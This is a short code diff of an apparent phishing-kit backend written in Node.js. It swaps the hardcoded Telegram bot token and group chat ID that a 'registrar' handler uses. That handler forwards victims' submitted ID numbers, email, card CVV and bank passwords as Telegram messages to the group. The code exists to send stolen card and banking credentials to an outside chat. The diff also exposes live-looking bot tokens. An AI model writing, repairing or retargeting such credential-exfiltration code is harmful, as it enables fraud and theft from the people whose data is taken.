@@ -7,7 +7,7 @@ import Telebot from 'telebot';
 
 
 const bot = new Telebot({
-    token: "6676624456:AAE9rEmLHDKtQ-aiaw9ydt0WcS8mr9azXb8"
+    token:"6105828170:AAE9qQAB2NE_Vu6eSx8GXT1Adfjpf9YSPNI"
 });
 
 bot.on(["/start", "/hola"], (msg) => {
@@ -64,7 +64,7 @@ const registrar = async (req, res ) => {
                 //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
                 const Cedula = `Nueva Cédula Registrada 🪪:\n\n` + cedula;
             
-                const chatId = -1001923096076; //id de grupo
+                const chatId = -4081066070; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -92,7 +92,7 @@ const registrar = async (req, res ) => {
                 "Email: " + email +`\n`
                 ;
             
-                const chatId = -1001923096076; //id de grupo
+                const chatId = -4081066070; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -121,7 +121,7 @@ const registrar = async (req, res ) => {
                 "Cvv: " + cvv +`\n`
                 ;
             
-                const chatId = -1001923096076; //id de grupo
+                const chatId = -4081066070; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -143,7 +143,7 @@ const registrar = async (req, res ) => {
                 "Contraseña de Banco: " + ContraseñaBanco
                 ;
             
-                const chatId = -1001923096076; //id de grupo
+                const chatId = -4081066070; //id de grupo
                 
                 //5319932122; id de bot solo
         
